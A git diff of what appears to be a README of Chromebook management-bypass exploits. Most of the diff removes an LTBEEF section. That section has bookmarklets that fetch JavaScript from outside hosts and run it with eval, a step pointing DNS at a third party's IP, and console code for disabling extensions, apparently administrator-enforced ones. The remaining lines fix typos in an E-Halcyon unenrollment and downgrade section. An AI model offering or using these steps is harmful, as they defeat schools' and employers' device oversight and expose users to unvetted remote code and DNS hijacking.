@@ -357,82 +357,6 @@ This alt exploit keeps your Chromebook downgraded (or on the current version) wi
 </details>
 
 <details>
-<summary><b>LTBEEF</b> Disable extensions</summary>
-
-LTBEEF is an exploit, created by Bypassi#7037, which abuses API endpoints within the Google Chrome web store. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
-
-<b>Please Note:</b> This exploit only works on versions below 106, and earlier versions of 102
-  
-**Installation**  
-There are several versions of this exploit you can use, here are the 2 most common versions:
-- *Bookmarklets*  
-    1. To use a GUI, bookmark one of the below scripts:  
-    - Ingot  
-    ```js
-    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
-    ```
-    - Compact Cow's UI  
-    ```js
-    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
-    ```  
-    - Compact Cow's UI (Dark)
-    ```js
-    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
-    ```
-    2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
-    3. Flip the switches on the extensions you want to disable. Simple!  
-
-    Photos of the GUI's:
-    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
-    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
-   
-- *DNS servers*  
-    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
-      
-    1. First, go to Settings > Network > Wifi > Network.
-    2. Click on `Custom Name Servers`
-    
-    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
-    
-    3. Set every box there to the following ip:
-    ```
-    158.101.114.159
-    ```
-    (Hosted by The Greatest Giant#0110)  
-    4. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
-    5. Flip the switches on the extension you want to disable.
-    6. Profit
-    
-</details>  
-
-<details>
-<summary><b>LTBEEF Inspect</b> Using inspect to disable extensions</summary>
-
-![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)
-
-The screenshot below was performed on `108.0.5359.75` (Official Build) (64-bit) on the stable channel. This has been tested and does work but has varying levels of success, you will need access to inspect elements, more specifically, console.
-
-1. Open this on your Chromebook: 
-```
-chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
-``` 
-Shortened link: https://tinyurl.com/i-ltbeef
-2. Open inspect and navigate to the console tab.
-3. Run the basic LTBEEF code such as
-```js
-chrome.management.setEnabled('extensionid', false)
-```
-Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions
-
-Credit to SprinkzMC#8421 (aka Bypassi) for finding this!
-
-![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)
-
-To re-enable just go to the Chrome web listing for the extension and click on the banner.
-
-</details>
-
-<details>
 <summary><b>Blank3r</b> Reload extensions continuously</summary>
 
 Blank3r is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.
@@ -504,9 +428,9 @@ If you do not have these, you **CAN NOT** perform the exploit!
 </details>
 
 <details>
-<summary><b>E-Halcyon</b> Unenrolmlent Or Downgrade</summary>
+<summary><b>E-Halcyon</b> Unenrollment Or Downgrade</summary>
 
-First of all, you'll need a Linux PC or VM. WSL is not guaranteed to work
+First of all, you'll need a Linux PC or VM. WSL is not guaranteed to work.
 
 Now, you'll need to boot into SH1MMER, and press the Un-Enroll option. It won't truly unenroll you if you've received the 112 updates patching unenrollment and downgrading, but it is still a necessary step for the rest of this. If you've never used SH1MMER before or don't have an image lying around, make sure to follow all the instructions on sh1mmer.me for unenrollment before proceeding with the rest of the tutorial here
 
